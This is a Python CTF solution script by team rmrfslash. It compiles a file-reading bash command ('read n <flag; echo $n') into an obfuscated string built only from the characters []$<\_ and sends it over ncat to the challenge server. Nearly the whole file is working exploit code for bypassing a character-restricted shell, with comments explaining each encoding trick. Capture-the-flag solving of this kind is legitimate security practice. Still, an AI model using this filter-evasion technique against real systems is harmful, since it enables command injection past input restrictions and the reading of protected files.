#!/usr/bin/env python3
#
# Compiles a bash command to read a file down to use only the following
# characters:
#   []$<\_
# for the CTF puzzle at [1].
#
# Many techniques borrowed from [2].
#
# [1] https://ctftime.org/task/12955
# [2] https://hack.more.systems/writeup/2017/12/30/34c3ctf-minbashmaxfun/
#
# Authors: Tej Kanwar, Ben Kraft (team rmrfslash)

import os
import subprocess
import sys

def escape(s, level):
    """Bash-escape the string `s`, `level` times."""
    if not level:
        return s
    out = ''
    for c in s:
        if c in r"""\$'<[]""":
            out += f"\\{c}"
        else:
            out += c
    return escape(out, level-1)


def comp(s, level=0):
    """Compiles a string to use the given characters.
    
    The return value will take `level+1` bash-expansions to collapse to the
    given string.

    The cases in this function are clearest if read in the following order:
        0
        1, 2, 4
        53
        else
        3, 6, 7

    Note that each case is a mix of recursive calls to comp(..., level-1), and
    calls to escape(..., level).  In particular, everything that needs to be
    ignored by all previous levels we escape; while things that the previous
    level needs to expand for us go through the recursive call to comp.  We
    also sometimes call comp(0), for things we know can be expanded without
    going any deeper.
    """
    if level < 0:
        raise Exception("We have to go deeper")
    out = ''
    while s:
        c = s[0]
        if s[:2] == '53':
            # 53 must be encoded specially to bootstrap the general encoding.
            # In particular, we plan to encode characters in octal, which means
            # we need the digits 0 through 7, but naively we only have 0, 1, 2,
            # and 4.  To solve that problem, it suffices to figure out how to
            # encode +, which is ASCII 053 in octal; we already have 0 but we
            # need a special case for the string '53'.
            #
            # The special case depends on the fact that we can already encode
            # 65 in octal (0101).  Meanwhile, 065, interpreted in octal, is 53
            # in decimal.  So we just do $[0$[0101]], which expands to $[065],
            # which expands to 53.
            out += escape(f'$[{comp("0")}$[{comp("0101")}]]', level)
            s = s[2:]
            continue
        elif c == '0':
            # 0 is the first character we compile.
            # $$ is the current process's pid, and $[] does
            # arithmetic-expansion (equivalent to $(())).  We don't know what
            # the pid will be, but we know it will be equal to itself.
            out += escape('$[$$<$$]', level)
        elif c == '1':
            # After 0 comes 1, for which we can use a similar trick.
            out += escape(f'$[{comp("0")}<$$]', level)
        elif c == '2':
            # 2, similarly, we can get from 1 with simple arithmetic.
            out += escape(f'$[{comp("1")}<<{comp("1")}]', level)
        elif c == '3':
            # Finally, with + we can encode any number.
            out += escape(f'$[{comp("1")}', level) + comp('+', level-1) + escape(f'{comp("2")}]', level)
        elif c == '4':
            # 4 works just like 2.
            out += escape(f'$[{comp("2")}<<{comp("1")}]', level)
        elif c == '5':
            out += escape(f'$[{comp("1")}', level) + comp('+', level-1) + escape(f'{comp("4")}]', level)
        elif c == '6':
            # Finally, with + we can encode any number.
            out += escape(f'$[{comp("2")}', level) + comp('+', level-1) + escape(f'{comp("4")}]', level)
        elif c == '7':
            # Finally, with + we can encode any number.
            out += escape(f'$[{comp("1")}', level) + comp('+', level-1) + escape(f'{comp("2")}', level) + comp('+', level-1) + escape(f'{comp("4")}]', level)
        elif c in r"""\$'<[]_""":
            # Allowed characters we can simply escape.
            out += escape(c, level)
        else:
            # Once we have all the right numbers in octal, we can use the
            # technique from [1] to get any character by using ANSI-C quoting:
            # $'\nnn' returns ASCII character whose encoding in octal is nnn,
            # e.g. $'\101' is A.  Note that the inner part -- the number --
            # must be returned after one fewer bash-expansion, so the next pass
            # will expand $'\101' into A.
            out += escape("$'\\", level) + comp(f"{ord(c):03o}", level-1) + escape("'", level)
        s = s[1:]
    return out

def check():
    # We need to choose in advance how many levels of encoding we want.  This
    # has to be at least enough for however deeply we will need to nest.
    level = 4
    # Now, we encode the actual command.
    compiled = (
        # First, we have to run the code through bash the right number of
        # times.  This technique is described more in [1].
        ''.join('$_' + escape('<<<', i) for i in range(level))
        # We really want to run "cat flag", but we don't have cat.  So instead
        # we have to run "read n <flag; echo $n".  But we need to make sure
        # each of those characters gets interpreted by the right level of bash;
        # otherwise bash will try to call that as a single word.  So basically
        # we tokenize the command ourselves, and put everything the last needs
        # to interpret at one level lower than everything it needs to treat as
        # special.  Honestly, this is kind of black magic, I fiddled with it to
        # get it right.
        + comp('read', level) + comp(' ', level-1)
        + comp('n', level) + comp(' ', level-1)
        + comp('<flag', level) + comp('; ', level-1)
        + comp('echo', level) + comp(' ', level-1)
        + comp('$', level) + comp('n', level-1)
        # We only get stdout back from the server, so we also redirect stderr
        # so we can see what's going wrong.
        + comp(' 2>&1', level-1)
    )

    # Now just print the command, and send it to the server!
    print('compiled', compiled)
    compiled += '\n'
    env = os.environ.copy()
    proc = subprocess.Popen('ncat --ssl xxx.allesctf.net 1337'.split(), stdin=subprocess.PIPE, env=env)
    # proc = subprocess.Popen('./init.sh'.split(), stdin=subprocess.PIPE, env=env)
    proc.communicate(compiled.encode())

if __name__ == '__main__':
    check()
